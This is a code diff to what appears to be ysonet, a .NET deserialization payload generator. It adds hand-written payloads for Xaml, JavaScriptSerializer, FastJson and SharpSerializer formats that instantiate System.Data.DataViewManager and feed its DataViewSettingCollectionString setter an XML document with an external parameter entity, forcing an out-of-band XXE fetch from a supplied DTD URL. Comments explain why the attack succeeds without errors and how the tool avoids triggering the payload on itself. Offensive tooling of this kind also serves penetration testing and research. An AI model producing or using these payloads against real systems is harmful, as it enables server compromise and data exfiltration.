@@ -71,7 +71,7 @@ namespace ysonet.Generators
                 Formatters.Xaml,
                 Formatters.JavaScriptSerializer,
                 Formatters.FastJson,
-                "SharpSerializerXml",
+                Formatters.SharpSerializerXml,
                 Formatters.SharpSerializerBinary
             };
         }
@@ -90,8 +90,97 @@ namespace ysonet.Generators
         public override object Generate(string formatter, InputArgs inputArgs)
         {
             string url = ValidateDtdUrl(inputArgs.Cmd);
-            object payload = NonRceGadgetPayloadBuilder.DataViewManagerXxe(url, formatter);
-            return NonRceGadgetPayloadBuilder.Finish(payload, formatter, inputArgs);
+            return FinishHandWrittenPayload(BuildPayload(url, formatter), formatter, inputArgs);
+        }
+
+        // The two spellings of the carrier's name: the assembly qualified form the JSON-family
+        // serializers and the MessagePack/SharpSerializer type swaps need, and the space-free
+        // form the hand written SharpSerializer XML document uses.
+        private const string DataViewManagerAssemblyQualifiedName =
+            "System.Data.DataViewManager, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
+
+        private const string DataViewManagerShortName =
+            "System.Data.DataViewManager,System.Data,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089";
+
+        /// <summary>
+        /// The XML the DataViewSettingCollectionString setter parses. The setter builds an
+        /// XmlTextReader over this string and calls Read(), which parses the DOCTYPE before
+        /// it validates the root name, so the external parameter entity is fetched first.
+        ///
+        /// The DOCTYPE name is the root name the setter expects, so the setter does not even
+        /// throw afterwards.
+        /// </summary>
+        internal static string XxeXml(string dtdUrl)
+        {
+            return "<!DOCTYPE DataViewSettingCollectionString ["
+                 + "<!ENTITY % remote SYSTEM \"" + dtdUrl + "\">"
+                 + "%remote;"
+                 + "]><DataViewSettingCollectionString/>";
+        }
+
+        // Every formatter here sets ONE property by name. The URL is never escaped with
+        // --rawinput: it travels inside a quoted DTD external identifier inside an XML
+        // document inside the outer payload, and ValidateDtdUrl has already rejected the
+        // characters that would break any of those layers.
+        private object BuildPayload(string url, string formatter)
+        {
+            string xml = XxeXml(url);
+
+            if (IsFormatter(formatter, Formatters.Xaml))
+            {
+                return @"<DataViewManager DataViewSettingCollectionString=""" + EscapeForXmlAttribute(xml, false) + @""" xmlns=""clr-namespace:System.Data;assembly=System.Data"" />";
+            }
+
+            if (IsFormatter(formatter, Formatters.JavaScriptSerializer))
+            {
+                return @"
+{
+    ""__type"":""" + DataViewManagerAssemblyQualifiedName + @""",
+    ""DataViewSettingCollectionString"":""" + EscapeForJson(xml, false) + @"""
+}";
+            }
+
+            if (IsFormatter(formatter, Formatters.FastJson))
+            {
+                return @"
+{
+    ""$types"":{
+        """ + DataViewManagerAssemblyQualifiedName + @""":""1""
+    },
+    ""$type"":""1"",
+    ""DataViewSettingCollectionString"":""" + EscapeForJson(xml, false) + @"""
+}";
+            }
+
+            if (IsFormatter(formatter, Formatters.SharpSerializerXml))
+            {
+                return @"
+<Complex type=""" + DataViewManagerShortName + @""">
+    <Properties>
+        <Simple name=""DataViewSettingCollectionString"" value=""" + EscapeForXmlAttribute(xml, false) + @"""/>
+    </Properties>
+</Complex>";
+            }
+
+            if (IsFormatter(formatter, Formatters.SharpSerializerBinary))
+            {
+                // No document to hand write here, and constructing the real DataViewManager
+                // would fire the payload inside ysonet, so serialize the surrogate below and
+                // swap the type name in the stream.
+                return SharpSerializerTypeSwap.SerializeAs(
+                    new DataViewManagerSurrogate { DataViewSettingCollectionString = xml },
+                    DataViewManagerAssemblyQualifiedName);
+            }
+
+            throw UnsupportedFormatter(formatter);
+        }
+
+        // Shape only: the property name is what SharpSerializer writes into the binary
+        // stream. Never deserialized as itself - SharpSerializerTypeSwap rewrites the type
+        // name to System.Data.DataViewManager before the payload leaves ysonet.
+        internal sealed class DataViewManagerSurrogate
+        {
+            public string DataViewSettingCollectionString { get; set; }
         }
 
         /// <summary>
